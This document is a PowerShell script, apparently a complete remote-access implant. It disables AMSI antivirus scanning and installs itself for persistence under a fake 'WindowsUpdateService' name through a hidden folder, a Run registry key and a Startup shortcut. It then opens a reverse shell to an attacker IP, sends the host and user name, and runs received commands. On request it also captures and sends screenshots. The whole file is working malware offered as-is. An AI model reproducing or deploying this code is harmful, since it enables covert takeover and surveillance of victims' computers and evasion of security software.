# payload_manual.ps1 – Shell + Manual Screenshot
$ATTACKER_IP = "192.168.100.32"
$PORT = 4445

# AMSI Bypass
try { [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) } catch {}

function Get-Screenshot {
    Add-Type -AssemblyName System.Drawing -ErrorAction SilentlyContinue
    Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $bytes = $ms.ToArray()
        $bitmap.Dispose(); $graphics.Dispose(); $ms.Close()
        return [Convert]::ToBase64String($bytes)
    } catch {
        return "ERROR: $($_.Exception.Message)"
    }
}

# Persistence (optional – for this test we can skip)
function Install-Persistence {
    $targetDir = "$env:APPDATA\Microsoft\Windows\Update"
    $targetFile = "$targetDir\WindowsUpdateService.ps1"
    if (Test-Path $targetFile) { return }
    $sourcePath = $MyInvocation.MyCommand.Path
    if (-not $sourcePath) { $sourcePath = $PSCommandPath }
    if (-not $sourcePath) { return }
    New-Item -Path $targetDir -ItemType Directory -Force -ErrorAction SilentlyContinue
    attrib +h $targetDir
    Copy-Item -Path $sourcePath -Destination $targetFile -Force -ErrorAction SilentlyContinue
    $reg = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $val = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetFile`""
    Set-ItemProperty -Path $reg -Name "WindowsUpdateService" -Value $val -ErrorAction SilentlyContinue
    $startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $lnk = "$startup\WindowsUpdateService.lnk"
    $wshell = New-Object -ComObject WScript.Shell
    $sc = $wshell.CreateShortcut($lnk)
    $sc.TargetPath = "powershell.exe"
    $sc.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetFile`""
    $sc.WindowStyle = 7
    $sc.Save()
}

function Get-ReverseShell {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($ATTACKER_IP, $PORT)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535 | % {0}

        $info = "$env:COMPUTERNAME|$env:USERNAME"
        $sendbyte = [text.encoding]::ASCII.GetBytes($info + "`n")
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush()

        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)
            $cmd = $data.Trim()

            if ($cmd -eq "screenshot") {
                $img = Get-Screenshot
                $line = "SCREEN:" + $img + "`n"
                $sendbyte = [text.encoding]::ASCII.GetBytes($line)
                $stream.Write($sendbyte, 0, $sendbyte.Length)
                $stream.Flush()
                continue
            }

            # Shell command
            try {
                $output = Invoke-Expression $cmd 2>&1 | Out-String
            } catch {
                $output = $_.Exception.Message
            }
            if ($output.Length -eq 0) { $output = "OK`n" }
            $prompt = "PS " + (Get-Location).Path + "> "
            $sendback = $output + $prompt
            $sendbyte = [text.encoding]::ASCII.GetBytes($sendback)
            $stream.Write($sendbyte, 0, $sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
    } catch {}
}

function Main {
    Install-Persistence
    while ($true) {
        Get-ReverseShell
        Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30)
    }
}
Main